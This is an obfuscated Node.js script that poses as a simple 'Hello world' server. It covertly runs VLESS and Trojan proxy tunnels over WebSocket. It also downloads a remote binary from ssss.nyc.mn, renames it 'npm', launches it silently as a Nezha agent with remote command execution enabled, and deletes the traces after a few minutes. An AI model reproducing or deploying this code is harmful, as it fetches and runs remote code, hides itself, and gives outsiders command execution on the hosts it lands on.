const _0x55ecdf=_0x35ae;(function(_0x5d51b6,_0x1f8b7b){const _0x203b46=_0x35ae,_0x3f4c56=_0x5d51b6();while(!![]){try{const _0x150820=-parseInt(_0x203b46(0xea))/0x1*(-parseInt(_0x203b46(0xcd))/0x2)+-parseInt(_0x203b46(0xd6))/0x3+parseInt(_0x203b46(0x13e))/0x4*(parseInt(_0x203b46(0x145))/0x5)+-parseInt(_0x203b46(0x119))/0x6*(-parseInt(_0x203b46(0xd0))/0x7)+parseInt(_0x203b46(0xcb))/0x8*(parseInt(_0x203b46(0x129))/0x9)+parseInt(_0x203b46(0x140))/0xa+-parseInt(_0x203b46(0x138))/0xb;if(_0x150820===_0x1f8b7b)break;else _0x3f4c56['push'](_0x3f4c56['shift']());}catch(_0x264c03){_0x3f4c56['push'](_0x3f4c56['shift']());}}}(_0x4df8,0x3dcb2));const os=require('os'),http=require(_0x55ecdf(0x13a)),fs=require('fs'),axios=require(_0x55ecdf(0x136)),net=require(_0x55ecdf(0x122)),path=require('path'),crypto=require(_0x55ecdf(0xd8)),{Buffer}=require(_0x55ecdf(0x12b)),{exec,execSync}=require(_0x55ecdf(0x10f)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x55ecdf(0x135)][_0x55ecdf(0x137)]||_0x55ecdf(0x12d),NEZHA_SERVER=process[_0x55ecdf(0x135)][_0x55ecdf(0xf6)]||'',NEZHA_PORT=process[_0x55ecdf(0x135)][_0x55ecdf(0x125)]||'',NEZHA_KEY=process[_0x55ecdf(0x135)][_0x55ecdf(0x12c)]||'',DOMAIN=process['env'][_0x55ecdf(0xf2)]||_0x55ecdf(0xd4),AUTO_ACCESS=process[_0x55ecdf(0x135)][_0x55ecdf(0x10e)]||!![],WSPATH=process[_0x55ecdf(0x135)][_0x55ecdf(0xf1)]||UUID[_0x55ecdf(0x13f)](0x0,0x8),SUB_PATH=process['env'][_0x55ecdf(0x13d)]||'sub',NAME=process[_0x55ecdf(0x135)][_0x55ecdf(0xe2)]||_0x55ecdf(0x107),PORT=process['env'][_0x55ecdf(0x123)]||0x1eb4;let ISP='';const GetISP=async()=>{const _0x409ab7=_0x55ecdf;try{const _0x4d777e=await axios[_0x409ab7(0xd5)]('https://speed.cloudflare.com/meta'),_0x81fcc2=_0x4d777e[_0x409ab7(0x146)];ISP=(_0x81fcc2[_0x409ab7(0xe4)]+'-'+_0x81fcc2[_0x409ab7(0xce)])[_0x409ab7(0xd2)](/ /g,'_');}catch(_0x1b6106){ISP=_0x409ab7(0xd1);}};GetISP();const httpServer=http[_0x55ecdf(0x116)]((_0xbd4e76,_0x216dae)=>{const _0x4a3152=_0x55ecdf;if(_0xbd4e76['url']==='/'){const _0x3a980a=path[_0x4a3152(0x113)](__dirname,_0x4a3152(0x11b));fs['readFile'](_0x3a980a,'utf8',(_0x197855,_0x3549d2)=>{const _0x1ce3f0=_0x4a3152;if(_0x197855){_0x216dae[_0x1ce3f0(0x120)](0xc8,{'Content-Type':_0x1ce3f0(0xfc)}),_0x216dae['end'](_0x1ce3f0(0xe0));return;}_0x216dae['writeHead'](0xc8,{'Content-Type':'text/html'}),_0x216dae[_0x1ce3f0(0xd9)](_0x3549d2);});return;}else{if(_0xbd4e76[_0x4a3152(0xff)]==='/'+SUB_PATH){const _0x251a0c=_0x4a3152(0xf8)+UUID+'@'+DOMAIN+':443?encryption=none&security=tls&sni='+DOMAIN+_0x4a3152(0xf0)+DOMAIN+'&path=%2F'+WSPATH+'#'+NAME+'-'+ISP,_0x51657a='trojan://'+UUID+'@'+DOMAIN+_0x4a3152(0xdf)+DOMAIN+_0x4a3152(0xf0)+DOMAIN+'&path=%2F'+WSPATH+'#'+NAME+'-'+ISP,_0x172a17=_0x251a0c+'\x0a'+_0x51657a,_0x28c3a7=Buffer['from'](_0x172a17)[_0x4a3152(0xe5)](_0x4a3152(0x131));_0x216dae['writeHead'](0xc8,{'Content-Type':_0x4a3152(0x100)}),_0x216dae['end'](_0x28c3a7+'\x0a');}else _0x216dae['writeHead'](0x194,{'Content-Type':_0x4a3152(0x100)}),_0x216dae[_0x4a3152(0xd9)](_0x4a3152(0x117));}}),wss=new WebSocket[(_0x55ecdf(0x109))]({'server':httpServer}),uuid=UUID[_0x55ecdf(0xd2)](/-/g,''),DNS_SERVERS=[_0x55ecdf(0x13b),_0x55ecdf(0x110)];function _0x35ae(_0x46161e,_0x1ea248){_0x46161e=_0x46161e-0xcb;const _0x4df863=_0x4df8();let _0x35aed8=_0x4df863[_0x46161e];return _0x35aed8;}function resolveHost(_0x37b393){return new Promise((_0x383096,_0xee1b32)=>{const _0x4d4f0d=_0x35ae;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x4d4f0d(0xf3)](_0x37b393)){_0x383096(_0x37b393);return;}let _0x2feb3e=0x0;function _0xef2a2e(){const _0x271a1e=_0x4d4f0d;if(_0x2feb3e>=DNS_SERVERS[_0x271a1e(0x121)]){_0xee1b32(new Error(_0x271a1e(0x144)+_0x37b393+_0x271a1e(0xe6)));return;}const _0x46891e=DNS_SERVERS[_0x2feb3e];_0x2feb3e++;const _0x1f2348=_0x271a1e(0xe3)+encodeURIComponent(_0x37b393)+'&type=A';axios['get'](_0x1f2348,{'timeout':0x1388,'headers':{'Accept':_0x271a1e(0x10a)}})['then'](_0xcc2a59=>{const _0x24ad22=_0x271a1e,_0x29b5e9=_0xcc2a59[_0x24ad22(0x146)];if(_0x29b5e9['Status']===0x0&&_0x29b5e9[_0x24ad22(0x118)]&&_0x29b5e9[_0x24ad22(0x118)]['length']>0x0){const _0x520ab4=_0x29b5e9[_0x24ad22(0x118)][_0x24ad22(0xfb)](_0xef2ebb=>_0xef2ebb[_0x24ad22(0x133)]===0x1);if(_0x520ab4){_0x383096(_0x520ab4['data']);return;}}_0xef2a2e();})[_0x271a1e(0x13c)](_0x21a80f=>{_0xef2a2e();});}_0xef2a2e();});}function handleVlessConnection(_0x47cb5f,_0x4c6b12){const _0x36e714=_0x55ecdf,[_0x49cae1]=_0x4c6b12,_0x2e7110=_0x4c6b12[_0x36e714(0x13f)](0x1,0x11);if(!_0x2e7110[_0x36e714(0x12a)]((_0x58349e,_0xdb72f7)=>_0x58349e==parseInt(uuid[_0x36e714(0x147)](_0xdb72f7*0x2,0x2),0x10)))return![];let _0x25a149=_0x4c6b12['slice'](0x11,0x12)[_0x36e714(0xe8)]()+0x13;const _0x1febf1=_0x4c6b12['slice'](_0x25a149,_0x25a149+=0x2)['readUInt16BE'](0x0),_0x9d0fac=_0x4c6b12['slice'](_0x25a149,_0x25a149+=0x1)[_0x36e714(0xe8)](),_0x4808da=_0x9d0fac==0x1?_0x4c6b12[_0x36e714(0x13f)](_0x25a149,_0x25a149+=0x4)[_0x36e714(0x113)]('.'):_0x9d0fac==0x2?new TextDecoder()[_0x36e714(0xf7)](_0x4c6b12[_0x36e714(0x13f)](_0x25a149+0x1,_0x25a149+=0x1+_0x4c6b12[_0x36e714(0x13f)](_0x25a149,_0x25a149+0x1)['readUInt8']())):_0x9d0fac==0x3?_0x4c6b12['slice'](_0x25a149,_0x25a149+=0x10)[_0x36e714(0x132)]((_0x316625,_0x148796,_0x3ddcdf,_0x4fa064)=>_0x3ddcdf%0x2?_0x316625['concat'](_0x4fa064[_0x36e714(0x13f)](_0x3ddcdf-0x1,_0x3ddcdf+0x1)):_0x316625,[])[_0x36e714(0x148)](_0x74542d=>_0x74542d[_0x36e714(0x127)](0x0)[_0x36e714(0xe5)](0x10))[_0x36e714(0x113)](':'):'';_0x47cb5f[_0x36e714(0x111)](new Uint8Array([_0x49cae1,0x0]));const _0x530233=createWebSocketStream(_0x47cb5f);return resolveHost(_0x4808da)[_0x36e714(0x108)](_0x32231e=>{net['connect']({'host':_0x32231e,'port':_0x1febf1},function(){const _0x381a97=_0x35ae;this[_0x381a97(0x114)](_0x4c6b12[_0x381a97(0x13f)](_0x25a149)),_0x530233['on'](_0x381a97(0x12f),()=>{})[_0x381a97(0x124)](this)['on'](_0x381a97(0x12f),()=>{})['pipe'](_0x530233);})['on']('error',()=>{});})[_0x36e714(0x13c)](_0x5c52f9=>{const _0x189e76=_0x36e714;net['connect']({'host':_0x4808da,'port':_0x1febf1},function(){const _0x3b3ffc=_0x35ae;this[_0x3b3ffc(0x114)](_0x4c6b12['slice'](_0x25a149)),_0x530233['on'](_0x3b3ffc(0x12f),()=>{})[_0x3b3ffc(0x124)](this)['on'](_0x3b3ffc(0x12f),()=>{})[_0x3b3ffc(0x124)](_0x530233);})['on'](_0x189e76(0x12f),()=>{});}),!![];}function handleTrojanConnection(_0xa8ba74,_0x4aca61){const _0x219379=_0x55ecdf;try{if(_0x4aca61['length']<0x3a)return![];const _0x243bb3=_0x4aca61[_0x219379(0x13f)](0x0,0x38)['toString'](),_0x24e26c=[UUID];let _0x491126=null;for(const _0xaf6cbd of _0x24e26c){const _0x464738=crypto[_0x219379(0xcf)](_0x219379(0x11c))[_0x219379(0xe7)](_0xaf6cbd)['digest'](_0x219379(0xf5));if(_0x464738===_0x243bb3){_0x491126=_0xaf6cbd;break;}}if(!_0x491126)return![];let _0x38f3cd=0x38;_0x4aca61[_0x38f3cd]===0xd&&_0x4aca61[_0x38f3cd+0x1]===0xa&&(_0x38f3cd+=0x2);const _0x440c7b=_0x4aca61[_0x38f3cd];if(_0x440c7b!==0x1)return![];_0x38f3cd+=0x1;const _0x18b662=_0x4aca61[_0x38f3cd];_0x38f3cd+=0x1;let _0x15cd48,_0x4c68de;if(_0x18b662===0x1)_0x15cd48=_0x4aca61[_0x219379(0x13f)](_0x38f3cd,_0x38f3cd+0x4)[_0x219379(0x113)]('.'),_0x38f3cd+=0x4;else{if(_0x18b662===0x3){const _0x5eb9fc=_0x4aca61[_0x38f3cd];_0x38f3cd+=0x1,_0x15cd48=_0x4aca61[_0x219379(0x13f)](_0x38f3cd,_0x38f3cd+_0x5eb9fc)['toString'](),_0x38f3cd+=_0x5eb9fc;}else{if(_0x18b662===0x4)_0x15cd48=_0x4aca61[_0x219379(0x13f)](_0x38f3cd,_0x38f3cd+0x10)[_0x219379(0x132)]((_0x565413,_0x5e525e,_0x22a9fa,_0x4d736d)=>_0x22a9fa%0x2?_0x565413[_0x219379(0xfa)](_0x4d736d['slice'](_0x22a9fa-0x1,_0x22a9fa+0x1)):_0x565413,[])[_0x219379(0x148)](_0x5f0ab7=>_0x5f0ab7[_0x219379(0x127)](0x0)[_0x219379(0xe5)](0x10))[_0x219379(0x113)](':'),_0x38f3cd+=0x10;else return![];}}_0x4c68de=_0x4aca61[_0x219379(0x127)](_0x38f3cd),_0x38f3cd+=0x2;_0x38f3cd<_0x4aca61[_0x219379(0x121)]&&_0x4aca61[_0x38f3cd]===0xd&&_0x4aca61[_0x38f3cd+0x1]===0xa&&(_0x38f3cd+=0x2);const _0x46d747=createWebSocketStream(_0xa8ba74);return resolveHost(_0x15cd48)[_0x219379(0x108)](_0x439634=>{const _0x3359f7=_0x219379;net[_0x3359f7(0x104)]({'host':_0x439634,'port':_0x4c68de},function(){const _0x430ae6=_0x3359f7;_0x38f3cd<_0x4aca61[_0x430ae6(0x121)]&&this[_0x430ae6(0x114)](_0x4aca61[_0x430ae6(0x13f)](_0x38f3cd)),_0x46d747['on'](_0x430ae6(0x12f),()=>{})['pipe'](this)['on'](_0x430ae6(0x12f),()=>{})[_0x430ae6(0x124)](_0x46d747);})['on'](_0x3359f7(0x12f),()=>{});})[_0x219379(0x13c)](_0x5f0085=>{const _0x26a399=_0x219379;net[_0x26a399(0x104)]({'host':_0x15cd48,'port':_0x4c68de},function(){const _0x5ddbab=_0x26a399;_0x38f3cd<_0x4aca61[_0x5ddbab(0x121)]&&this[_0x5ddbab(0x114)](_0x4aca61[_0x5ddbab(0x13f)](_0x38f3cd)),_0x46d747['on'](_0x5ddbab(0x12f),()=>{})[_0x5ddbab(0x124)](this)['on']('error',()=>{})['pipe'](_0x46d747);})['on'](_0x26a399(0x12f),()=>{});}),!![];}catch(_0x289299){return![];}}wss['on'](_0x55ecdf(0xe9),(_0xe14f35,_0x5d1425)=>{const _0xfa19f7=_0x55ecdf,_0x419162=_0x5d1425['url']||'';_0xe14f35['once'](_0xfa19f7(0x126),_0x58c67e=>{const _0x492cde=_0xfa19f7;if(_0x58c67e[_0x492cde(0x121)]>0x11&&_0x58c67e[0x0]===0x0){const _0x43f10a=_0x58c67e[_0x492cde(0x13f)](0x1,0x11),_0x136f72=_0x43f10a[_0x492cde(0x12a)]((_0x18b495,_0x7bd72e)=>_0x18b495==parseInt(uuid[_0x492cde(0x147)](_0x7bd72e*0x2,0x2),0x10));if(_0x136f72){!handleVlessConnection(_0xe14f35,_0x58c67e)&&_0xe14f35[_0x492cde(0xd3)]();return;}}!handleTrojanConnection(_0xe14f35,_0x58c67e)&&_0xe14f35['close']();})['on'](_0xfa19f7(0x12f),()=>{});});const getDownloadUrl=()=>{const _0x37db8c=_0x55ecdf,_0x17b86d=os['arch']();return _0x17b86d===_0x37db8c(0xf9)||_0x17b86d==='arm64'||_0x17b86d==='aarch64'?!NEZHA_PORT?_0x37db8c(0xde):_0x37db8c(0x115):!NEZHA_PORT?_0x37db8c(0x143):'https://amd64.ssss.nyc.mn/agent';},downloadFile=async()=>{const _0x210665=_0x55ecdf;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x2d0575=getDownloadUrl(),_0x4ada31=await axios({'method':_0x210665(0xd5),'url':_0x2d0575,'responseType':_0x210665(0xcc)}),_0x423c83=fs[_0x210665(0x142)](_0x210665(0xfd));return _0x4ada31[_0x210665(0x146)]['pipe'](_0x423c83),new Promise((_0x250870,_0x5d84e7)=>{const _0x4d31ac=_0x210665;_0x423c83['on']('finish',()=>{console['log']('npm\x20download\x20successfully'),exec('chmod\x20+x\x20npm',_0x526dd2=>{if(_0x526dd2)_0x5d84e7(_0x526dd2);_0x250870();});}),_0x423c83['on'](_0x4d31ac(0x12f),_0x5d84e7);});}catch(_0x38c19d){throw _0x38c19d;}},runnz=async()=>{const _0x25aed0=_0x55ecdf;try{const _0x27ddbd=execSync('ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22',{'encoding':_0x25aed0(0x101)});if(_0x27ddbd[_0x25aed0(0x11d)]()!==''){console['log'](_0x25aed0(0x106));return;}}catch(_0x47ee91){}await downloadFile();let _0x187384='',_0x337e8d=[_0x25aed0(0xf4),_0x25aed0(0x103),'2096',_0x25aed0(0x11f),_0x25aed0(0x10d),_0x25aed0(0xe1)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x485b51=_0x337e8d['includes'](NEZHA_PORT)?'--tls':'';_0x187384=_0x25aed0(0xdc)+NEZHA_SERVER+':'+NEZHA_PORT+_0x25aed0(0x12e)+NEZHA_KEY+'\x20'+_0x485b51+_0x25aed0(0x128);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x205c93=NEZHA_SERVER['includes'](':')?NEZHA_SERVER[_0x25aed0(0x10c)](':')[_0x25aed0(0x141)]():'',_0xd701c2=_0x337e8d[_0x25aed0(0x130)](_0x205c93)?_0x25aed0(0x105):'false',_0x98e9d5=_0x25aed0(0xec)+NEZHA_KEY+_0x25aed0(0x11e)+NEZHA_SERVER+_0x25aed0(0xeb)+_0xd701c2+_0x25aed0(0x102)+UUID;fs[_0x25aed0(0xdb)](_0x25aed0(0x11a),_0x98e9d5);}_0x187384=_0x25aed0(0xef);}else{console[_0x25aed0(0x139)](_0x25aed0(0xfe));return;}}try{exec(_0x187384,{'shell':_0x25aed0(0xdd)},_0x894dfa=>{const _0xe913f2=_0x25aed0;if(_0x894dfa)console[_0xe913f2(0x12f)](_0xe913f2(0xda),_0x894dfa);else console[_0xe913f2(0x139)](_0xe913f2(0xd7));});}catch(_0x351936){console[_0x25aed0(0x12f)](_0x25aed0(0xee)+_0x351936);}};async function addAccessTask(){const _0x1a64ac=_0x55ecdf;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x3bc39e=_0x1a64ac(0x134)+DOMAIN;try{const _0x362e2c=await axios['post'](_0x1a64ac(0xed),{'url':_0x3bc39e},{'headers':{'Content-Type':'application/json'}});console[_0x1a64ac(0x139)](_0x1a64ac(0x112));}catch(_0x1c2481){}}const delFiles=()=>{const _0x2e881c=_0x55ecdf;fs[_0x2e881c(0x10b)](_0x2e881c(0xfd),()=>{}),fs[_0x2e881c(0x10b)](_0x2e881c(0x11a),()=>{});};function _0x4df8(){const _0x3ff0e9=['2452ZujDia','slice','1634200khigLE','pop','createWriteStream','https://amd64.ssss.nyc.mn/v1','Failed\x20to\x20resolve\x20','1235oPDeKl','data','substr','map','381272ndQRpC','stream','914302vYyPvE','asOrganization','createHash','7lMfOnU','Unknown','replace','close','1234.abc.com','get','1399533eatAHO','npm\x20is\x20running','crypto','end','npm\x20running\x20error:','writeFileSync','setsid\x20nohup\x20./npm\x20-s\x20','/bin/bash','https://arm64.ssss.nyc.mn/v1',':443?security=tls&sni=','Hello\x20world!','2053','NAME','https://dns.google/resolve?name=','country','toString','\x20with\x20all\x20DNS\x20servers','update','readUInt8','connection','1VtKrBk','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','client_secret:\x20','https://oooo.serv00.net/add-url','error:\x20','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','&fp=chrome&type=ws&host=','WSPATH','DOMAIN','test','443','hex','NEZHA_SERVER','decode','vless://','arm','concat','find','text/html','npm','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','url','text/plain','utf-8','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','8443','connect','true','npm\x20is\x20already\x20running,\x20skip\x20running...','Hug','then','Server','application/dns-json','unlink','split','2083','AUTO_ACCESS','child_process','1.1.1.1','send','Automatic\x20Access\x20Task\x20added\x20successfully','join','write','https://arm64.ssss.nyc.mn/agent','createServer','Not\x20Found\x0a','Answer','956100vlduZp','config.yaml','index.html','sha224','trim','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','2087','writeHead','length','net','PORT','pipe','NEZHA_PORT','message','readUInt16BE','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','63AFyyiI','every','buffer','NEZHA_KEY','0dc330db-6aa4-4677-9c59-8bbe19f9e0c6','\x20-p\x20','error','includes','base64','reduce','type','https://','env','axios','UUID','5998608MDYLxU','log','http','8.8.4.4','catch','SUB_PATH'];_0x4df8=function(){return _0x3ff0e9;};return _0x4df8();}httpServer['listen'](PORT,()=>{const _0x5c35c1=_0x55ecdf;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x5c35c1(0x139)]('Server\x20is\x20running\x20on\x20port\x20'+PORT);});
